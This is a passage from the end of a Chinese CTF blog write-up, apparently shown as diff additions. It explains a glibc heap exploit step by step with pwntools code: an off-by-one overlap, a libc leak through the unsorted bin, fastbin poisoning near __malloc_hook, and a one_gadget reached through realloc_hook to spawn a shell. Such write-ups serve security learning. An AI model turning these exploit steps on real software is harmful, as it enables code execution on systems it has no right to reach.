chunk7&gt;chunk8 </span></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">'f'</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(libc_base+<span class="number">0x3c4aed</span>)) <span class="comment">#malloc_hook- 0x23</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'B'</span>*<span class="number">0x10</span>)<span class="comment">#get idx7</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">payload += p64(one_daget) <span class="comment">#realloc_hook ：one_gaget</span></span><br><span class="line">payload+= p64(libc_base+<span class="number">0x84710</span>+<span class="number">0x0c</span>)<span class="comment">#malloc_hook ：realloc+0xc</span></span><br><span class="line"><span class="comment">#0x84710</span></span><br><span class="line">add(<span class="number">0x60</span>,payload) <span class="comment">#get idx8  </span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">"choice: "</span>)<span class="comment">#触发漏洞</span></span><br><span class="line">sh.sendline(str(<span class="number">1</span>))</span><br><span class="line">sh.recvuntil(<span class="string">"size?"</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(str(<span class="number">0x10</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>从第一行开始看：</p>
+<p>先申请三个堆块，利用idx0 off by one修改idx1的size域</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)	<span class="comment">#idx0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'b'</span>*<span class="number">0x10</span>)	<span class="comment">#idx1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'c'</span>*<span class="number">0x10</span>)	<span class="comment">#idx2</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p8(<span class="number">0x41</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/08/11/kMOErLsuavFzwpK.png" alt=""></p>
+<p>idx1的size已经变为0x41，此时将其释放，再申请回来，便与idx2堆块产生重叠。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'e'</span>*<span class="number">0x30</span>) <span class="comment">#idx1</span></span><br></pre></td></tr></table></figure>
+
+<p>产生了overlaping，那么接下来开始操作了，</p>
+<p>通过编辑idx1，将idx2的size域改为0x91，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>))<span class="comment">#idx2.size:0x91</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">4</span>) <span class="comment">#idx3</span></span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0</span>))<span class="comment">#idx4</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"A"</span>*<span class="number">0x10</span>)  <span class="comment">#idx5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)	<span class="comment">#idx6</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">0x21</span>))	<span class="comment">#idx7</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'c'</span>*<span class="number">0x10</span>)	<span class="comment">#idx8</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'c'</span>*<span class="number">0x10</span>)	<span class="comment">#idx9</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/08/11/wuAZ4ltnMLigdkB.png" alt=""></p>
+<p>到这，堆空间长这样，在我看来，3，4堆块没什么用，不知道大佬有什么用意，可能就是为了开辟0x90的空间吧。</p>
+<p>这时将chunk2free掉，就会进入unsorted bin，当unsorted bin里只有一个chunk时，该chunk的fd和bk指针均指向unsorted bin本身，而unsorted bin本身的地址与libc的基址之间的偏移是固定的，所以我们可以借此来泄露libc 基址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)  <span class="comment">#释放到unsorted bin里</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'e'</span>*<span class="number">0x20</span>) <span class="comment">#idx1</span></span><br><span class="line">show(<span class="number">1</span>) <span class="comment">#leak main_arena+88</span></span><br><span class="line"></span><br><span class="line">libc_base=u64(sh.recv(<span class="number">38</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x68</span><span class="number">-0x3c4b10</span><span class="comment">#malloc</span></span><br><span class="line"><span class="comment">#0x3c4b78</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span> + hex(libc_base)</span><br><span class="line">one_daget_offset=<span class="number">0x4527a</span></span><br><span class="line">one_daget=libc_base+one_daget_offset</span><br></pre></td></tr></table></figure>
+
+<p>这里delete(1)是因为chunk2的size区域有00字段，导致在调用show函数的时候，puts函数会造成截断无法输出unsorted bin的地址，尝试使用edit函数来修改chunk2的size区域，但是edit函数会将回车替换成00，所以我们这里先释放chunk1，然后再申请，add函数在输入内容的时候不会把回车修改为00字符。</p>
+<p>接着便可以计算libc基址和one_gadget了</p>
+<p>5，6，7，8堆块和上面基本类似，堆块5off by one修改堆块6的size域，然后free、malloc6，使得6与7产生堆块重叠，（在我看来，可以把这几个堆块合并到上面，不要3，4了），使得后面6可以修改到7的fd指针。这里malloc chunk9是为了在释放chunk8的时候不与top chunk合并。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#fast bin chunk7&gt;chunk8 </span></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">'f'</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(libc_base+<span class="number">0x3c4aed</span>)) <span class="comment">#malloc_hook- 0x23</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'B'</span>*<span class="number">0x10</span>)<span class="comment">#get idx7</span></span><br></pre></td></tr></table></figure>
+
+<p>先释放chunk8，再释放chunk7，使fast bin 链表结构为chunk7-&gt;fd=chunk8 ，修改chunk6来修改chunk7的fd指针为fake_chunk的指针。然后，先malloc 0x60得到chunk7，再次malloc 0x60，系统会认为chunk7-&gt;fd指向的地址为空闲的chunk，便会将fake_chunk指向内存空间返还给我们，同时将payload写入。</p>
+<p>还有一个之前我比较迷得地方，为什么fake_chunk要申请到<code>malloc_hook- 0x23</code>这样一个位置</p>
+<p>原因两点：1.首先要考虑在hook附近，以便利用，这里realloc_hook、malloc_hook都可以利用。</p>
+<p>　　　　　２.放一张图立马就知道了</p>
+<p><img src="https://i.loli.net/2020/08/11/tluzdIYBOTLnpyM.png" alt=""></p>
+<p>这里没有对齐，我手动对齐一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f763bbe2aed</span>: <span class="number">0x763bbe1260000000</span>	<span class="number">0x000000000000007f</span></span><br><span class="line"><span class="number">0x7f763bbe2afd</span>:	<span class="number">0x763b8a3ea0000000</span>	<span class="number">0x763b8a3a7000007f</span></span><br><span class="line"><span class="number">0x7f763bbe2b0d</span>: <span class="number">0x000000000000007f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f763bbe2b1d</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>我的天，典型的chunk结构</p>
+<p>之前一直不懂为什么要在这里构造，我查看内存都是0x28、0x20这种对齐的格式，实在想不通的时候，我直接查看了0x23，看到这张图我恍然大悟。。</p>
+<p>接着就可以构造payload了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">payload += p64(one_daget) <span class="comment">#realloc_hook ：one_gaget</span></span><br><span class="line">payload+= p64(libc_base+<span class="number">0x84710</span>+<span class="number">0x0c</span>)<span class="comment">#malloc_hook ：realloc+0xc</span></span><br><span class="line"><span class="comment">#0x84710</span></span><br><span class="line">add(<span class="number">0x60</span>,payload) <span class="comment">#get idx8</span></span><br></pre></td></tr></table></figure>
+
+<p>由于fake_chunk处于一个非对齐的格式，所以先填上11个\x00，之后将realloc_hook的地址填上</p>
+<p>one_gaget，在malloc_hook的位置填上realloc+0xc的地址。</p>
+<p>另一个重点：为什么不直接把one_gaget填到malloc_hook处呢？</p>
+<p>这是由于one_gadget的限制，</p>
+<p><img src="https://i.loli.net/2020/08/11/M63ChXJHuwjgZSe.png" alt=""></p>
+<p>以第二个og为例，必须保证此时的[rsp+0x30] == NULL ，而有时程序并非满足此条件，那么该怎么办呢？</p>
+<p>需要malloc_hook与realloc相互配合，利用realloc函数中大量的push操作，来达到新的rsp+0x30 ==null的目的，具体实现参考<a href="https://blog.csdn.net/Maxmalloc/article/details/102535427" target="_blank" rel="noopener">这个师傅的讲解</a>，是个高手╰(￣ω￣ｏ)。</p>
+<p><img src="https://img-blog.csdnimg.cn/20191013175155220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01heG1hbGxvYw==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>这一步真的是最狗血的一步，调了好长时间，终于调出来了</p>
+<p>可以看到现在的rsp+0x30处并不是null，而在它偏移0x30的地方就有一个0，那么就可以通过跳过realloc的6个push来使之后的rsp抬高0x30，之后就可以跳到<strong>realloc_hook</strong>来执行og了</p>
+<p><img src="https://i.loli.net/2020/08/11/PEqzWCFpwbIv5G7.png" alt=""></p>
+<p>最后需要1选项来触发malloc，如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">"choice: "</span>)<span class="comment">#触发漏洞</span></span><br><span class="line">sh.sendline(str(<span class="number">1</span>))</span><br><span class="line">sh.recvuntil(<span class="string">"size?"</span>)</span><br><span class="line">sh.sendline(str(<span class="number">0x10</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>过程：</strong></p>
+<p><strong>调用malloc函数—-&gt;判断是否有malloc_hook，有则调用之—-&gt;我们这里malloc_hook设置的为realloc函数+offset，程序便到此处执行—-&gt;执行realloc函数时，会判断是否有realloc_hook，有则调用之—-&gt;我们这里realloc_hook设置的为one_gadget，所以便会转到one_gadget处执行。</strong></p>
+<p><img src="https://i.loli.net/2020/08/11/t6GjbmLXWDV5oeQ.png" alt="image-20200811205817134"></p>
+<p>这样就成功拿到shell了</p>
+<h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>堆题太灵活，必须要熟练掌握的知识太多了，现在水平太菜，这几天的夏令营课实在听不下去，为什么我感觉大佬讲的基础知识都那么深奥…</p>
+<p>唯一的收获就是装了新工具2333333</p>
+<p>也没啥写了，等以后想起来有什么补充的再回来添吧。</p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://ld1ng.com/2020/08/11/simple_heap/" title="Welcome to the world of Heap">http://ld1ng.com/2020/08/11/simple_heap/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/ld1ng" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/liding.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/ld1ng" target="_blank"><span class="text-dark">Ld1ng</span><small class="ml-1x"></small></a></h3>
+        <div>Primary school students majoring in information security.</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2020/08/05/WMCTF/" title="WMCTF2020"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="Catalogue" role="button">
+        <span>[&nbsp;</span><span>Catalogue</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>Maybe you could buy me a cup of coffee.</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/ipay.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechat.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ld1ng" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://weibo.com/5580147545/profile?" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/Liding10763325" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2020 Ld1ng
+        
+        <div class="publishby">
+        	Theme by <a href="https://github.com/ld1ng" target="_blank"> ld1ng </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'axhOjPzscogBppPjn36rtaAv-gzGzoHsz',
+    appKey: 'gMB6OHiHJvIxpnVtuoYxyPhk',
+    placeholder: 'Just go go',
+    avatar: 'wavatar',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
+  <script>
+  //利用 FancyBox 实现点击图片放大
+  $(document).ready(function() {
+    $('article img').not('[hidden]').not('.panel-body img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+      var $imageWrapLink = $image.parent('a');
+      if ($imageWrapLink.length < 1) {
+        var src = this.getAttribute('src');
+        var idx = src.lastIndexOf('?');
+        if (idx != -1) {
+          src = src.substring(0, idx);
+        }
+        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+      }
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+        $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+    $().fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+    });
+  });
+  </script>
+
+
+
+
+
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="150" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+ <!-- 页面点击礼花效果 -->
+<script type="text/javascript" src="/js/firework.js"></script>
+</body>
+</html>
